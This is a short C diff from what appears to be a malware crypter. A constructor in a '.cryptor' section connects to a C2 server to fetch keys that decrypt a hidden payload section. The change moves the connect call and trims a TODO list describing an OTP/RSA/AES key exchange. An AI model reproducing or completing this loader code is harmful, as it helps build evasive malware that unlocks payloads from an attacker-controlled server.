@@ -92,18 +92,18 @@ __attribute__((constructor, section(".cryptor"))) int construct(){
         WSACleanup();
         exit(0);
     }
-    if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
-    {
-        printf("here");
-        exit(-1);
-    }
 /*
  * Attempt to connect to the C2 server to retrieve the keys necessary to decrypt
  * the payolad section, for this to work this client transmits a OTP that has been
  * encrypted using an RSA public key (Length defined by the Conf file, default 4096)
  */
+    if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
+    {
+        printf("here");
+        exit(-1);
+    }
+
 /** TODO
- * CONNECT TO SERVER
  * SEND ENCRYPTED OTP
  * RECIVE PAYLOAD ENCRYPTION KEY
  * USE OTP TO RETRIVE AES KEY
